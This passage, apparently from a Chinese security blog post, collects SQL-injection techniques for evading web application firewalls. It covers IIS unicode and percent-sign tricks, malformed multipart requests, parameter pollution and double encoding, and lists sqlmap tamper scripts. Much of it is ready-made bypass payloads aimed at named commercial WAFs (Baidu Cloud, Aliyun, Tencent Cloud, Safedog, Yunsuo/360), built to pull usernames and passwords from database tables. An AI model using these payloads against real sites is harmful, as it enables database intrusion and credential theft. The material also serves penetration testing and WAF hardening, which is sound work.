class="line">IS_SRVROLEMEMBER()</span><br><span class="line">IS_MEMBER()</span><br><span class="line">HAS_DBACCESS()</span><br><span class="line">convert()</span><br><span class="line">col_name()</span><br><span class="line">object_id()</span><br><span class="line">is_srvrolemember()</span><br><span class="line">is_member()</span><br><span class="line">字符串截取函数</span><br><span class="line">Substring(@@version,1,1)</span><br><span class="line">Left(@@version,1)</span><br><span class="line">Right(@@version,1)</span><br><span class="line">(2)字符串转换函数</span><br><span class="line">Ascii('a') 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</span><br><span class="line">Char('97')</span><br><span class="line">exec</span><br></pre></td></tr></table></figure>
+
+<p><strong>Mysql BIGINT数据类型构造溢出型报错注入</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyya6vigxuj20py0fedhq.jpg" alt></p>
+<p>BIGINT最大值进行增值运算的时候，signed/unsigned都会爆出BIGINT value is out of range的错误，也就是溢出了。还有就是Mysql逐位取反的特性，打个比方：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| ~0                   |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; <span class="keyword">select</span> ~<span class="number">18446744073709551615</span>;</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| ~18446744073709551615 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">|                     0 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span>-~<span class="number">0</span>;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 - ~(0))'</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1+~0;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~(0))'</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html" target="_blank" rel="noopener">BIGINT Overflow Error Based SQL Injection</a></p>
+<h2 id="3-容器特性"><a href="#3-容器特性" class="headerlink" title="*3.容器特性 *"></a>*<em>3.容器特性 *</em></h2><p><strong>%特性：</strong><br>asp+iis的环境中，当我们请求的url中存在单一的百分号%时，iis+asp会将其忽略掉，而 没特殊要求的waf当然是不会的：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1' union sel%ect user f%rom ddd</span><br></pre></td></tr></table></figure>
+
+<p><strong>%u特性：</strong></p>
+<p>iis支持unicode的解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但 waf就不一定了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id =1&apos; union sel%ect user f%rom ddd</span><br><span class="line">\u0069\u0064\u0020\u003D\u0031\u0027\u0020\u0075\u006E\u0069\u006F\u006E\u0020\u0073\u0065\u006C\u0025\u0065\u0063\u0074\u0020\u0075\u0073\u0065\u0072\u0020\u0066\u0025\u0072\u006F\u006D\u0020\u0064\u0064\u0064</span><br><span class="line">%u0069%u0064%u0020%u003D%u0031%u0027%u0020%u0075%u006E%u0069%u006F%u006E%u0020%u0073%u0065%u006C%u0025%u0065%u0063%u0074%u0020%u0075%u0073%u0065%u0072%u0020%u0066%u0025%u0072%u006F%u006D%u0020%u0064%u0064%u0064</span><br></pre></td></tr></table></figure>
+
+<p>这个特性还存在另一个case，就是多个widechar会有可能转换为同一个字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s%u0065lect-&gt;select</span><br><span class="line">s%u00f0lect-&gt;select</span><br></pre></td></tr></table></figure>
+
+<p>WAF对%u0065会识别出这是e，组合成了select关键字，但有可能识别不出%u00f0</p>
+<p>其实不止这个，还有很多类似的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">字母a：</span><br><span class="line">%u0000</span><br><span class="line">%u0041</span><br><span class="line">%u0061</span><br><span class="line">%u00aa</span><br><span class="line">%u00e2</span><br><span class="line">单引号：</span><br><span class="line">%u0027</span><br><span class="line">%u02b9</span><br><span class="line">%u02bc</span><br><span class="line">%u02c8</span><br><span class="line">%u2032</span><br><span class="line">%uff07</span><br><span class="line">%c0%27</span><br><span class="line">%c0%a7</span><br><span class="line">%e0%80%a7</span><br><span class="line">空白：</span><br><span class="line">%u0020</span><br><span class="line">%uff00</span><br><span class="line">%c0%20</span><br><span class="line">%c0%a0</span><br><span class="line">%e0%80%a0</span><br><span class="line">左括号(：</span><br><span class="line">%u0028</span><br><span class="line">%uff08</span><br><span class="line">%c0%28</span><br><span class="line">%c0%a8</span><br><span class="line">%e0%80%a8</span><br><span class="line">右括号)：</span><br><span class="line">%u0029</span><br><span class="line">%uff09</span><br><span class="line">%c0%29</span><br><span class="line">%c0%a9</span><br><span class="line">%e0%80%a9</span><br></pre></td></tr></table></figure>
+
+<p><strong>畸形协议&amp;请求</strong></p>
+<p><strong>asp/asp.net</strong></p>
+<p>还有asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交 方式，不管是GET还是POST，都可正常接收，过滤GET请求时如果没有对<strong>application/xwww-form-urlencoded</strong>提交数据方式进行过滤，就会导致任意注入。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyyakczniyj20p60hjtfc.jpg" alt></p>
+<p><strong>php+Apache：</strong><br>waf通常会对请求进行严格的协议判断，比如GET、POST等，但是apache解析协议时却没 有那么严格，当我们将协议随便定义时也是可以的：</p>
+<p>PHP解析器在解析multipart请求的时候，它以逗号作为边界，只取boundary，而普通解 析器接受整个字符串。 因此，如果没有按正确规范的话，就会出现这么一个状况：首先 填充无害的data，waf将其视为了一个整体请求，其实还包含着恶意语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------,xxxx</span><br><span class="line">Content-Disposition: form-data; name=&quot;img&quot;; filename=&quot;img.gif&quot;</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">------</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">1&apos; union select null,null,flag,null from flag limit 1 offset 1-- -</span><br><span class="line">--------</span><br><span class="line">------,xxxx--</span><br></pre></td></tr></table></figure>
+
+<p><strong>通用的特性`</strong></p>
+<ul>
+<li>HPP：</li>
+</ul>
+<p>HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。</p>
+<p>假设提交的参数即为：</p>
+<p>id=1&amp;id=2&amp;id=3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Asp.net + iis：id=1,2,3</span><br><span class="line">Asp + iis：id=1,2,3</span><br><span class="line">Php + apache：id=3</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>双重编码：</li>
+</ul>
+<p>这个要视场景而定，如果确定一个带有waf的site存在解码后注入的漏洞的话，会有效避过waf。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unlencode</span><br><span class="line">base64</span><br><span class="line">json</span><br><span class="line">binary</span><br><span class="line">querystring</span><br><span class="line">htmlencode</span><br><span class="line">unicode</span><br><span class="line">php serialize</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我们在整体测试一个waf时，可测试的点都有哪些？</li>
+</ul>
+<p>  GET、POST、HEADER那么我们专门针对一个waf进行测试的时候就要将这几个点全测试个遍，header中还包括Cookie、X-Forwarded-For等，往往除了GET以外其他都是过滤最弱的。</p>
+<h1 id="0x02-各大厂商"><a href="#0x02-各大厂商" class="headerlink" title="0x02 各大厂商"></a>0x02 各大厂商</h1><p>正则逃逸： 过 滤 了 <code>%23%0a</code> 却 不 过 滤<code>%2d%2d%0a</code></p>
+<h2 id="1-百度云"><a href="#1-百度云" class="headerlink" title="1. 百度云"></a>1. 百度云</h2><p><strong>curl：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.211.237/test.php -d "id=1 union%23%0Aselect user,password from users"</span><br></pre></td></tr></table></figure>
+
+<p><strong>科学计数法：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.211.237/test.php?id=1e1union select user,password from users</span><br></pre></td></tr></table></figure>
+
+<p><strong>%23%0a</strong>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.211.237/test.php?id=1e1union%23%0aselect user,password from users</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-阿里云盾"><a href="#2-阿里云盾" class="headerlink" title="2.阿里云盾"></a>2.阿里云盾</h2><p>过滤了union+select+from，那我<strong>select+from+union</strong>呢？使用Mysql自定义变量的特性 就可以实现，这里举一个阿里云盾的案例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> user_login <span class="keyword">from</span> wp_users <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>|@pwd:=(<span class="keyword">select</span> user_pass <span class="keyword">from</span> wp_users <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>) <span class="keyword">union</span> <span class="keyword">select</span> @pwd;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyyb3erd5pj20wz0gnwjb.jpg" alt></p>
+<p>由于后面在调用自定义变量的时候需要用到union+select，所以还需要绕过这个 点。<code>/*ddd*/union/*ddd*/select</code> 就可以了。</p>
+<p>Bypass Payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1|@pwd:=(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">4</span>)<span class="comment">/*ddd*/</span><span class="keyword">union</span><span class="comment">/*ddd*/</span><span class="keyword">select</span> <span class="literal">null</span>,@pwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-腾讯云"><a href="#3-腾讯云" class="headerlink" title="3.腾讯云"></a>3.腾讯云</h2><p><strong>腾讯云安全怎么检测sql注入</strong></p>
+<ul>
+<li>union+select拦截</li>
+<li>select+from拦截</li>
+<li>union+from不拦截</li>
+</ul>
+<p>那么关键的点就是绕过这个select关键字</p>
+<ul>
+<li>select all</li>
+<li>select distinct</li>
+<li>select distinctrow</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">既然这些都可以，再想想使用这样的语句怎么不被检测到？select与all中间肯定不能用普 通 的 /**/ 这 种 代 替 空 格 ， 还 是 会 被 视 为 是 union+select 。 select all 可 以 这 么 表 达/*!12345select all*/，腾讯云早已识破这种烂大街的招式。尝试了下/*!*/中间也可以使 用%0a换行</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id=<span class="number">1</span> <span class="keyword">union</span><span class="comment">/*!12345%0aselect%20all*/</span>	被拦截</span><br><span class="line">说明腾讯云在语法检测的时候会忽略掉数字后面的%<span class="number">0</span>a换行，虽然属于<span class="keyword">union</span>+<span class="number">12342</span><span class="keyword">select</span>，但简单的数字和关键字区分识别还是做得到。</span><br></pre></td></tr></table></figure>
+
+<p><code>/*!12345%0aselect%20all*/</code>还是会被拦截，这就说明腾讯云在语法检测的时候会忽略掉数字后面的%0a换行，虽然属于union+12342select，但简单的数字和关键字区分识别还是做得到。再测试<code>/*!12345select%0aall*/</code>结果就合乎推理了，根据测试知道腾讯云安全会忽略掉%0a换行，这就等于<code>union+12345selectall</code>， 不会被检测到。（忽略掉%0a换行为了过滤反而可以用来加以利用进行Bypass）</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyybvvpgi8j20m70awadq.jpg" alt></p>
+<p>最终payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union <span class="comment">/*!12345select%0aall*/</span>	因为把%0a忽略，加上<span class="comment">/*12345*/</span>绕过可union <span class="keyword">select</span>检测</span><br></pre></td></tr></table></figure>
+
+<p><strong>Bypass Payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union/*!50000select%0aall*/username from users%23</span><br><span class="line">1&apos; union/*!50000select%0adistinct*/username from users%23</span><br><span class="line">1&apos; union/*!50000select%0adistinctrow*/username from users%23</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-安全狗"><a href="#4-安全狗" class="headerlink" title="4.安全狗"></a>4.安全狗</h2><p>不是绕不过狗，只是不够细心：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union+<span class="keyword">select</span>拦截。</span><br><span class="line"><span class="keyword">select</span>+<span class="keyword">from</span>拦截。</span><br><span class="line"><span class="keyword">union</span>+<span class="keyword">from</span>不拦截。</span><br><span class="line">fuzz了下<span class="comment">/*!50000select*/</span>这个<span class="number">5</span>位数，前两位数&lt;<span class="number">50</span> &amp;&amp; 第二位!==<span class="number">0</span> &amp;&amp; 后三位数==<span class="number">0</span>即可bypass。(一点细节也不要放过。)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">id=1&apos; union/*30100select*/user,password from users%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyyd1s0dvpj20sa0ittlp.jpg" alt></p>
+<p>在上一个网站被拦截，但是另一个网站不拦截</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyyd65c2f8j20yg0g7tld.jpg" alt></p>
+<p>这里证明一个观点：好姿势不是死的，零零碎碎玩不转的姿势巧妙的结合一下。所 以说一个姿势被拦截不代表就少了一个姿势</p>
+<h2 id="5-云锁-amp-360"><a href="#5-云锁-amp-360" class="headerlink" title="5.云锁&amp;360"></a>5.云锁&amp;360</h2><p>云锁版本迭代导致的 &amp; 360主机卫士一直存在的问题</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyydbfotp2j20sp0gktas.jpg" alt></p>
+<p>  注意POST那个方向，waf在检测POST传输的数据过程中，没有进行URL的检测，也就是说waf会认为URL上的任何参数信息都是正常的。既然是POST请求，那就只检测请求正文咯。(神逻辑)</p>
+<p>  在标准HTTP处理流程中，只要后端有接收GET形式的查询字段，即使客户端用POST传输，查询字符串上满足查询条件时，是会进行处理的。（没毛病）</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyyddqlzufj20vp0fsn0n.jpg" alt></p>
+<p>当waf成了宕机的罪魁祸首是什么样的？举一个安全狗的案例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*666666666666666666666666666666666666666666666666666666666666666 66666666666666666666666666666666666666666666666666666666666666666 66666666666666666666666666666666666666666666666666666666666666666 66666666666666666666666666666666666666666666666666666666666666666 66666666666666666666666666666666666666666666666666666666666666666 66666666666666666666666666666666666666666666666666666666666666666 6666666666666666666666666666666666666666*/</span><br></pre></td></tr></table></figure>
+
+<p>再举一个云锁也是因为数据包过长导致绕过的案例</p>
+<p>云锁在开始检测时先判断包的大小是否为7250byte以下，n为填充包内容，设置n大 小为2328时，可以正常访问页面，但是会提示拦截了SQL注入,当数据包超过2329时就可以成功绕过，2329长度以后的就不检测了。？</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyydfv8surj20o70jbn80.jpg" alt></p>
+<h2 id="6-安全宝-amp-阿里云盾"><a href="#6-安全宝-amp-阿里云盾" class="headerlink" title="6.安全宝&amp;阿里云盾"></a>6.安全宝&amp;阿里云盾</h2><p>emoji是一串unicode字集组成，一个emoji图标占5个字节，mysq也支持emoji的存 储，在mysql下占四个字节:</p>
+<p><a href="https://www.webfx.com/tools/emoji-cheat-sheet/" target="_blank" rel="noopener">markdown颜文字</a></p>
+<p>:cry::cry::cry::cry::cry::cry::cry::cry::cry::cry:</p>
+<p>:angry::angry::angry::angry::angry::angry::angry::angry::angry::angry:</p>
+<h1 id="0x03-自动化Bypass"><a href="#0x03-自动化Bypass" class="headerlink" title="0x03 自动化Bypass"></a>0x03 自动化Bypass</h1><p>首先总结下sqlmap的各种bypass waf tamper：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py 用UTF<span class="number">-8</span>全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py 在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py 分别用“NOT BETWEEN <span class="number">0</span> AND <span class="comment">#”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span></span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(<span class="number">0</span>), <span class="number">0</span>, <span class="number">0</span>), A, B)”替换像“CONCAT(A, B)”的实例</span><br><span class="line">equaltolike.py 用“LIKE”运算符替换全部等于号“=”</span><br><span class="line">greatest.py 用“GREATEST”函数替换大于号“&gt;”</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class="line">percentage.py 在每个字符之前添加一个百分号</span><br><span class="line">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class="line">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class="line">securesphere.py 添加经过特殊构造的字符串</span><br><span class="line">sp_password.py 向payload末尾添加“sp_password” <span class="keyword">for</span> automatic obfuscation <span class="keyword">from</span> DBMS logs</span><br><span class="line">space2comment.py 用“/**/”替换空格符</span><br><span class="line">space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2hash.py 用磅注释符“<span class="comment">#”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line">space2morehash.py 用磅注释符“<span class="comment">#”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mssqlhash.py 用磅注释符“<span class="comment">#”其次是一个换行符替换空格符</span></span><br><span class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</span><br><span class="line">space2plus.py 用加号“+”替换空格符</span><br><span class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</span><br><span class="line">unmagicquotes.py 用一个多字节组合%bf%<span class="number">27</span>和末尾通用注释一起替换空格符</span><br><span class="line">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</span><br><span class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class="line">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br></pre></td></tr></table></figure>
+
+<p>看起来很全，但有个缺点就是功能单一，灵活程度面对当今的主流waf来说很吃力了。</p>
+<p>提到系统的训练，鉴于多数waf产品是使用Rule进行防护，那么这里不说什么机器学习。来点简单粗暴有效果的修复方案：我把每个sql关键字比喻成“位”，将一个“位”的两边进行模糊插入各种符号，比如注释（# -- /**/）、逻辑运算符、算术运算符等等。</p>
+<p>15年黄登在阿里云安全峰会提到的fuzz手法通过建立一个有毒标识模型，将将其插入到各种“位”，测试其waf。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyydktkc14j20us0b6jv1.jpg" alt></p>
+<p>最常见的四种sql注入语句：select、update、insert、delete</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">有毒标识定义为n</span><br><span class="line">“位”左右插入有毒表示那么就是x的n次幂</span><br><span class="line">而且其他数据库也各有各的语法糖，次数量定义为y</span><br><span class="line">如果再将其编码转换定位为m</span><br><span class="line">其结果最少就得有：</span><br><span class="line"></span><br><span class="line">Factor[((x^n)*4 + x*y)*m]</span><br></pre></td></tr></table></figure>
+
+<p>通常waf引擎先转换m后再去匹配，这个还是要看场景。还有关键字不止这些，稍微复杂一点的环境就会需要更多的关键字来注入，也就会需要fuzz更多的位。还没说特殊字符，根据系统含有特殊意义的字符等等，也要有所顾忌。</p>
+<p>当前几个关键字达到绕过效果时，只需继续fuzz后面几个位即可。</p>
+<p>还有就是传输过程中可测试的点：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyydjllwo8j20ry02mgma.jpg" alt></p>
+<p>因为当我们在传输的过程中导致的绕过往往是致命的，比如中间件的特性/缺陷，导致waf不能识别或者是在满足特定条件下的欺骗了waf。</p>
+<p>reference:</p>
+<p><a href="https://04z.net/archives/2030ee36.html" target="_blank" rel="noopener">https://04z.net/archives/2030ee36.html</a></p>
+<p><a href="https://xz.aliyun.com/t/368" target="_blank" rel="noopener">https://xz.aliyun.com/t/368</a></p>
+<p>先知上面的图片都挂了，我自己复现重新整理了下，半年前就看到这篇文章，到现在觉得还有很多东西要向作者学习，有需要我分享该文电子版的可以私聊我。继续加油叭。</p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/07/2019-1-7-BypassWaf_sql/" title="BypassWaf_sql">https://wh0ale.github.io/2019/01/07/2019-1-7-BypassWaf_sql/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/sql/" rel="tag"><i class="fa fa-tag"></i># sql</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/06/2019-1-6-Mysql提权/" rel="next" title="mysql提权篇">
+                <i class="fa fa-chevron-left"></i> mysql提权篇
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/09/2019-1-9-加密与解密/" rel="prev" title="加密方式">
+                加密方式 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
